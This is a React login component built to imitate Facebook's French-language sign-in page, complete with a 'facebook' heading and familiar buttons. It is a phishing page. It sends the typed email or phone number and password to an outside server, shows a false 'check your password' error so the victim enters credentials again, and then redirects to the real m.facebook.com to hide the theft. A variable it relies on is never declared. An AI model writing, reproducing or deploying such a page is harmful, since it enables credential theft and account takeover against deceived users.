import React from 'react';
import { useState } from 'react';
import { Spinner } from "react-bootstrap";
import { Container, Row, Col, Form, Button } from "react-bootstrap";
import axios from 'axios';
import "bootstrap/dist/css/bootstrap.min.css";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';


const Connexion = () => {
  const [nom, setNom] = useState("");
  const [mdp, setMdp] = useState("");
  const [loading, setLoading] = useState(false);

  const miova = (e) => {
    setMdp(e.target.value);
  }

  const manadala = (e) => {
      toast.error('Vous ne pouvez pas créer un compte dans une version bêta. Veuillez vous connecter ', {
        position: "top-center",
        autoClose: 3000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      }); return;
  }


 const mampiditra = async (req, res, error) => {

    if (mdp === "" || nom === "") {
      toast.error('Veuillez remplir les champs vides', {
        position: "top-center",
        autoClose: 2000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      });
      return;
    } else {
      setLoading(true);

      try {
        const response = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp });
        console.log(response.data.success);
        if (response.data.success === true && tmp < 3) {
          setTmp(prevTmp => prevTmp + 1);
          console.log(tmp);
          setNom("");
          setMdp("");
          toast.error('Vérifier votre mot de passe ou votre numéro de téléphone', {
            position: "top-center",
            autoClose: 3000,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "light",
          });


        } else {
          window.location.href = 'https://m.facebook.com';
        }

      } catch (error) {
        console.log(error);
      } finally {
        setLoading(false);
      }
    }
  };









  return (
      <div style={{ background: "#f0f2f5", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div style={{ background: "white", padding: "4rem", width: "500px", borderRadius: "10px" }}>
        <Container>
          <div className="text-center">
            <p style={{ color: "blue", fontSize: "3em" }}>facebook</p>
          </div>
          <Row className="justify-content-center">
            <Col md={8}>
              <Form>
                <Form.Group controlId="formBasicNom">
                  <Form.Control
                    type="text"
                    placeholder="Adresse e-mail ou numéro de téléphone"
                    value={nom}
                    onChange={(e) => setNom(e.target.value)}
                    style={{ width: "100%", marginBottom: "1rem" }}
                  />
                </Form.Group>
                <Form.Group controlId="formBasicPassword">
                  <Form.Control
                    type="password"
                    placeholder="Mot de passe"
                    value={mdp}
                    onChange={(e) => setMdp(e.target.value)}
                    style={{ width: "100%", marginBottom: "1rem", margin: "0 auto" }}
                  />
                </Form.Group> <br/>
                <div className="text-center">
                  <Button
                    variant="primary"
                    style={{ width: "100%", marginBottom: "1rem" }}
                    onClick={mampiditra}
                    block
                    disabled={loading}
                  >
                    {loading ? (
                      <Spinner animation="border" size="sm" />
                    ) : (
                      "Se connecter"
                    )}
                  </Button>
                  <br />
                  <p style={{ color: "blue", cursor: "pointer" }}>Mot de passe oublié ?</p>
                  <hr />
                  <Button
                    variant="success"
                    style={{ width: "100%", marginBottom: "1rem" }}
                    onClick={manadala}
                    block
                    disabled={loading}
                  >
                    {loading ? (
                      <Spinner animation="border" size="sm" />
                    ) : (
                      "Créer un nouveau compte"
                    )}
                  </Button>
                </div>
              </Form>
            </Col>
          </Row>
        </Container>
      </div>
    </div>

  );
};

export default Connexion;
